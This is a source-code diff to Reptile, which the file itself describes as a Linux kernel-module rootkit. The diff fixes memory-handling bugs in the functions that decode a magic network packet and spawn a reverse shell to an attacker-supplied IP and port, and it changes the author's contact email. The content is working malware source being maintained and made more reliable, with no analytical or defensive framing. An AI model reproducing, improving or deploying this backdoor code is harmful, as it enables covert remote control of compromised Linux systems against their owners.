@@ -128,9 +128,9 @@ void shell_execer(struct work_struct *work) {
 
     	exec(argv);
     	if(task) {
-		bzero(task->path, strlen(task->path));	
-		bzero(task->ip, strlen(task->ip));	
-		bzero(task->port, strlen(task->port));	
+		//bzero(task->path, strlen(task->path));	
+		//bzero(task->ip, strlen(task->ip));	
+		//bzero(task->port, strlen(task->port));	
 		kfree(task);
 	}
 }
@@ -144,8 +144,8 @@ int shell_exec_queue(char *path, char *ip, char *port) {
 
     	REPTILE_INIT_WORK(&task->work, &shell_execer);
     	task->path = kstrdup(path, GFP_KERNEL);
-    	task->ip = ip;
-    	task->port = port;
+    	task->ip = kstrdup(ip, GFP_KERNEL);
+    	task->port = kstrdup(port, GFP_KERNEL);
 
     	return queue_work(work_queue, &task->work);
 }
@@ -232,11 +232,13 @@ int atoi(char *str){
 
 void decode_n_spawn(char *data) {
 	int tsize;
-	char *ip, *port = NULL, *buf = NULL;  
+	char *ip, *port, *p = NULL, *buf = NULL;  
 
     	tsize = strlen(TOKEN);
-	buf = (char *) kmalloc(tsize+24, GFP_KERNEL);
-	if(!buf) return;
+	p = (char *) kmalloc(tsize+24, GFP_KERNEL);
+	if(!p) return;
+
+	buf = p; // save the base pointer to free it right
 
         bzero(buf, tsize+24);
         memcpy(buf, data, tsize+24);
@@ -248,7 +250,7 @@ void decode_n_spawn(char *data) {
 	strsep(&buf, " ");
 
         if((atoi(port) > 0 && atoi(port) <= 65535) || (strlen(ip) >= 7 && strlen(ip) <= 15)) shell_exec_queue(SHELL, ip, port);
-	//if(buf) kfree(buf);
+	if(p) kfree(p);
 }
 
 unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *socket_buffer, 
@@ -649,5 +651,5 @@ static void __exit reptile_exit(void) {
 module_init(reptile_init);
 module_exit(reptile_exit);
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("F0rb1dd3n - ighor@intruder-security.com");
+MODULE_AUTHOR("F0rb1dd3n - f0rb1dd3n@tuta.io");
 MODULE_DESCRIPTION("Reptile - A linux LKM rootkit");
